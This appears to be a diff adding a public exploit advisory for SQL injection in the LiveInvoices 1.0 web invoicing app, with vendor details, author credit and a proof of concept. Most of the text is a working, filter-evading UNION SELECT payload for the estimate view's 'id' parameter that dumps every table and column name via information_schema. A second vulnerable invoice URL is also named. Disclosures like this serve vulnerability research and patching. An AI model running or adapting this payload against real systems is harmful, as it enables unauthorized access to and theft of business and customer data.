@@ -1,0 +1,28 @@
+# # # # #
+# Exploit Title: LiveInvoices 1.0 - SQL Injection
+# Dork: N/A
+# Date: 18.08.2017
+# Vendor Homepage : http://livecrm.co/
+# Software Link: https://codecanyon.net/item/liveinvoices-complete-invoicing-system-crm/20243375
+# Demo: http://liveinvoices.livecrm.co/livecrm/web/
+# Version: 1.0
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+# # # # #
+# Exploit Author: Ihsan Sencan
+# Author Web: http://ihsan.net
+# Author Social: @ihsansencan
+# # # # #
+# Description:
+# The vulnerability allows the users to inject sql commands ...
+# 	
+# Proof of Concept:
+# 
+# http://localhost/[PATH]/index.php?r=estimate/estimate/view&id=[SQL]
+# 62++/*!11111UnioN*/(/*!11111sELECt*/+0x283129,0x283229,0x283329,0x283429,(select(@x)/*!22222from*/(/*!22222select*/(@x:=0x00),(@running_number:=0),(@tbl:=0x00),(/*!22222select*/(0)/*!22222from*/(information_schema.columns)/*!22222where*/(table_schema=database())and(0x00)in(@x:=/*!22222CoNcaT*/(@x,0x3c62723e,if((@tbl!=table_name),/*!22222CoNcaT*/(0x3c2f6469763e,LPAD(@running_number:=@running_number%2b1,2,0x30),0x3a292020,0x3c666f6e7420636f6c6f723d7265643e,@tbl:=table_name,0x3c2f666f6e743e,0x3c62723e,(@z:=0x00),0x3c646976207374796c653d226d617267696e2d6c6566743a333070783b223e),0x00),lpad(@z:=@z%2b1,2,0x30),0x3a292020,0x3c666f6e7420636f6c6f723d626c75653e,column_name,0x3c2f666f6e743e))))x),0x283629,0x283729,0x283829,0x283929,0x28313029,0x28313129,0x28313229,0x28313329)--+-
+# 
+# http://localhost/[PATH]/index.php?r=invoice/invoice/view&id=[SQL]
+# 
+# Etc...
+# # # # #
